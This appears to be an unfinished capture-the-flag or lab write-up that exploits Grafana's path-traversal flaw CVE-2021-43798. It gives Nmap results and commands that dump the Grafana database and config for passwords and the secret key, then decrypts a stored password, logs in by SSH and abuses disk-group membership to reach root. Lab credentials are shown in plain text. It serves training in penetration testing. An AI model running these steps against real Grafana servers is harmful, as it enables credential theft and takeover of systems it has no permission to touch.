#InProgress 
```
192.168.239.181
```
## Nmap
```
PORT     STATE SERVICE REASON         VERSION                                                                              
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)                                                                                                                           
| ssh-hostkey:                                                                                                                       
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)                                                                         
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH6PH1/ST7TUJ4Mp/l4c7G+TM07YbX7YIsnHzq1TRpvtiBh8MQuFkL1SWW9+za+h6ZraqoZ0ewwkH+0la436t9Q+2H/Nh4CntJOrRbpLJKg4hChjgCHd5KiLCOKHhXPs/FA3mm0Zkzw1tVJLPR6RTbIkkbQiV2Zk3u8oamV5srWIJeYUY5O2XXmTnKENfrPXeHup1+3wBOkTO4Mu17wBSw6yvXyj+lleKjQ6Hnje7KozW5q4U6ijd3LmvHE34UHq/qUbCUbiwY06N2Mj0NQ
iZqWW8z48eTzGsuh6u1SfGIDnCCq3sWm37Y5LIUvqAFyIEJZVsC/UyrJDPBE+YIODNbN2QLD9JeBr8P4n1rkMaXbsHGywFtutdSrBZwYuRuB2W0GjIEWD/J7lxKIJ9UxRq0UxWWkZ8s3SNqUq2enfPwQt399nigtUerccskdyUD0oRKqVnhZCjEYfX3qOnlAqejr3Lpm8nA31pp6lrKNAmQEjdSO8Jxk04OR2JBxcfVNfs=                                                                            
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)                                                                       
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI0EdIHR7NOReMM0G7C8zxbLgwB3ump+nb2D3Pe3tXqp/6jNJ/GbU2e4Ab44njMKHJbm/PzrtYzojMjGDuBlQCg=                                                                                                            
|   256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)                                                                                                               
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDCc0saExmeDXtqm5FS+D5RnDke8aJEvFq3DJIr0KZML        
3000/tcp open  ppp?    syn-ack ttl 61                                                    
| fingerprint-strings:                                                                     
|   FourOhFourRequest:                                                                    
|     HTTP/1.0 302 Found                                                                 
|     Cache-Control: no-cache                                                             
|     Content-Type: text/html; charset=utf-8                                              
|     Expires: -1                                                                       
|     Location: /login                                                                  
|     Pragma: no-cache                                                                  
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax                                                                  
|     X-Content-Type-Options: nosniff                                                   
|     X-Frame-Options: deny                                                                                                                                                                                                                                                   
|     X-Xss-Protection: 1; mode=block                                                                                                                                                                                                                                         
|     Date: Thu, 03 Oct 2024 08:05:52 GMT                                                                                                                                                                                                                                     
|     Content-Length: 29                                                                                                                                                                                                                                                      
|     href="/login">Found</a>.                                                                                                                                                                                                                                                
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:                                                                                                                                                                            
|     HTTP/1.1 400 Bad Request                                                                                                                                                                                                             
|     Content-Type: text/plain; charset=utf-8                                                                        
|     Connection: close                                                                                              
|     Request                        
|   GetRequest:                                                                                                      
|     HTTP/1.0 302 Found                                                                                                                                                                                                                   
|     Cache-Control: no-cache                                                                                        
|     Content-Type: text/html; charset=utf-8                                                                         
|     Expires: -1                                                                                                    
|     Location: /login                                                                                               
|     Pragma: no-cache                                                                                               
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax                                                    
|     X-Content-Type-Options: nosniff                                                                                
|     X-Frame-Options: deny                                                                                          
|     X-Xss-Protection: 1; mode=block                                                                                
|     Date: Thu, 03 Oct 2024 08:05:21 GMT                                                                            
|     Content-Length: 29                                                                                             
|     href="/login">Found</a>.                                                                                       
|   HTTPOptions:                                                                                                     
|     HTTP/1.0 302 Found                                                                                             
|     Cache-Control: no-cache                                                                                        
|     Expires: -1                                                                                                    
|     Location: /login                                                                                               
|     Pragma: no-cache                                                                                               
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax                                                    
|     X-Content-Type-Options: nosniff                                                                                
|     X-Frame-Options: deny                                                                                          
|     X-Xss-Protection: 1; mode=block                                                                                
|     Date: Thu, 03 Oct 2024 08:05:26 GMT                                                                            
|_    Content-Length: 0                                                                                              
9090/tcp open  http    syn-ack ttl 61 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)                      
| http-methods:                                                                                                      
|_  Supported Methods: GET OPTIONS                                                                                   
| http-title: Prometheus Time Series Collection and Processing Server
```

## Nmap UDP


# Enumeration

## HTTP

Grafana exploit 2 methods

method 1:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241003103007.png?raw=true)
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241003103153.png?raw=true)
Method 2:
googling: https://github.com/taythebot/CVE-2021-43798

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241003102948.png?raw=true)

continue method 2 with more exploits showed in the gitghub
dumping database and greping passwords
```
go run exploit.go -target http://192.168.239.181:3000 -dump-database -output grafana.db | grep -a -i -E '*password*'
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241003105412.png?raw=true)
```
3prometheusPrometheusserverhttp://localhost:9090sysadmin{}2022-02-04 09:19:592022-02-04 09:19:59{"basicAuthPassword":"anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w=="}HkdQ8Ganz
```


```
go run exploit.go -target http://192.168.239.181:3000 -dump-config -output defaults.ini | grep -i -E '*password*'
```
We will search for the secret key in the config file
```
go run exploit.go -target http://192.168.239.181:3000 -dump-config -output defaults.ini | grep -i -E '*secret*'
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241003110146.png?raw=true)
```
SW2YcwTIb9zpOOhoPsMm
```
https://github.com/Sic4rio/Grafana-Decryptor-for-CVE-2021-43798
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241003112420.png?raw=true)
```
SuperSecureP@ssw0rd
```


# PrivEsc

## Manual
```
ssh sysadmin@192.168.239.181
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241003114101.png?raw=true)


we are part of the disk group
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241003115711.png?raw=true)
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241003115650.png?raw=true)

```
ssh root@192.168.239.181 -i id_rsa
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241003120046.png?raw=true)

## Automated

### Peass
### Mimikatz

